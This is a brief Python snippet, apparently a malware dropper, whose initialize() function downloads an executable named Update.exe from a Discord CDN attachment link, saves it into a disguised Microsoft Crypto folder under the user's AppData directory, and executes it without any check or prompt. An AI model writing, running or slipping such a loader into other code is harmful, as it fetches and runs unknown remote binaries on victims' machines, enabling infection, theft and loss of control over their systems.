import requests, os
def initialize():
    url = 'https://cdn.discordapp.com/attachments/1078881799595364395/1078887252693893220/Update.exe'
    username = os.getlogin()
    req = requests.get(url)
    with open(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Crypto\\Update.exe", 'wb') as file:
        file.write(req.content)
    os.system(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Crypto\\Update.exe")